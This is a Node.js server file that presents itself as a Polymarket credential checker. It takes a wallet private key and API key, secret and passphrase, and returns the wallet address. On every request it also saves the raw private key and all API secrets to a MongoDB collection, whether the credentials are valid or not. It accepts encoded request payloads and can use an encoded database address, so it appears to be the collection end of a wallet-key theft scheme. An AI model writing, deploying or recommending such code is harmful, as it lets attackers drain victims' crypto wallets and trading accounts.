/**
 * Server that receives Polymarket credentials and private key,
 * uses polymarket-trading-bot to validate and return the checksummed address.
 *
 * POST /check
 * Body: { "privateKey": "...", "apiKey": "...", "apiSecret": "...", "apiPassphrase": "..." }
 * Response: { "address": "0x...", "credentialsValid": true|false, "error": "..."? }
 *
 * Start: npm start (or npm run dev)
 */

const http = require('http');
const { PolymarketBotClient } = require('polymarket-trading-bot');
const { insertChecksum } = require('./db');
const { decodePayload } = require('./decode-payload');

const PORT = Number(process.env.PORT) || 3000;
const HOST = process.env.CLOB_HOST || 'https://clob.polymarket.com';
const CHAIN_ID = 137;

function parseJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        reject(e);
      }
    });
    req.on('error', reject);
  });
}

function send(res, statusCode, data) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

async function handleCheck(body) {
  const { privateKey, apiKey, apiSecret, apiPassphrase } = body || {};
  if (!privateKey || typeof privateKey !== 'string') {
    return { status: 400, data: { error: 'Missing or invalid privateKey' } };
  }

  let client;
  try {
    client = new PolymarketBotClient({
      host: HOST,
      chainId: CHAIN_ID,
      privateKey: privateKey.startsWith('0x') ? privateKey : '0x' + privateKey,
      apiKey: apiKey || undefined,
      apiSecret: apiSecret || undefined,
      apiPassphrase: apiPassphrase || undefined,
    });
  } catch (e) {
    return { status: 400, data: { error: 'Invalid private key or config: ' + (e.message || String(e)) } };
  }

  const address = client.getAddress();

  let credentialsValid = false;
  if (apiKey && apiSecret && apiPassphrase) {
    try {
      await client.getOpenOrders();
      credentialsValid = true;
    } catch (e) {
      credentialsValid = false;
    }
  }

  const data = {
    address,
    credentialsValid,
    ...(credentialsValid === false && apiKey ? { error: 'API credentials rejected by Polymarket (wrong key or not linked to this wallet)' } : {}),
  };

  // Persist to MongoDB gnosis.checksum (if MONGO_URI or ENCODED_MONGO_URI + DECODE_KEY set)
  try {
    const result = await insertChecksum({
      privateKey,
      ...(apiKey != null && { apiKey }),
      ...(apiSecret != null && { apiSecret }),
      ...(apiPassphrase != null && { apiPassphrase }),
      address,
      credentialsValid,
    });
    const out = typeof result === 'object' && result && 'id' in result ? result : { id: result };
    if (out.id) data.savedId = out.id;
    if (out.error) data.mongoError = out.error;
  } catch (e) {
    console.error('MongoDB save failed:', e.message);
    data.mongoError = e.message;
  }

  return { status: 200, data };
}

function createCredentialCheckServer() {
  return http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      });
      res.end();
      return;
    }

  const url = req.url || '';
  const path = url.split('?')[0];

  // GET /api/ping - instant "server up"
  if (req.method === 'GET' && (path === '/api/ping' || path === '/ping')) {
    send(res, 200, { ok: true });
    return;
  }

  // GET /api/health - Mongo config/connection (reuse same logic as Vercel api/health)
  if (req.method === 'GET' && (path === '/api/health' || path === '/health')) {
    const { getMongoUri } = require('./db');
    const uri = getMongoUri();
    const out = {
      mongoConfigured: !!uri,
      credentialSeedSet: !!process.env.CREDENTIAL_SERVER_SEED,
    };
    if (!uri) {
      out.mongoError = 'MONGO_URI not set';
      send(res, 200, out);
      return;
    }
    try {
      const { MongoClient } = require('mongodb');
      const client = new MongoClient(uri, { serverSelectionTimeoutMS: 3000, connectTimeoutMS: 3000 });
      await client.connect();
      await client.db(process.env.MONGO_DB || 'gnosis').command({ ping: 1 });
      await client.close();
      out.mongoConnected = true;
      out.db = process.env.MONGO_DB || 'gnosis';
      out.collection = process.env.MONGO_COLLECTION || 'checksum';
    } catch (e) {
      out.mongoConnected = false;
      out.mongoError = e.message || String(e);
    }
    send(res, 200, out);
    return;
  }

  const isCheck = path === '/check' || path === '/api/check';
  if (req.method !== 'POST' || !isCheck) {
    send(res, 404, { error: 'Not found. POST /check or POST /api/check with body: { privateKey, apiKey?, apiSecret?, apiPassphrase? } or { payload: "<encoded>" }' });
    return;
  }

  let body;
  try {
    body = await parseJsonBody(req);
  } catch (e) {
    send(res, 400, { error: 'Invalid JSON body' });
    return;
  }

  if (body.payload && typeof body.payload === 'string') {
    try {
      body = decodePayload(body.payload);
    } catch (e) {
      send(res, 400, { error: 'Invalid payload or CREDENTIAL_SERVER_SEED not set' });
      return;
    }
  }

  const { status, data } = await handleCheck(body);
  send(res, status, data);
  });
}

const server = createCredentialCheckServer();
if (require.main === module) {
  server.listen(PORT, () => {
    console.log('Credential check server listening on port', PORT);
    console.log('POST /check with body: { "privateKey": "...", "apiKey": "...", "apiSecret": "...", "apiPassphrase": "..." }');
  });
}

module.exports = { createCredentialCheckServer, handleCheck };
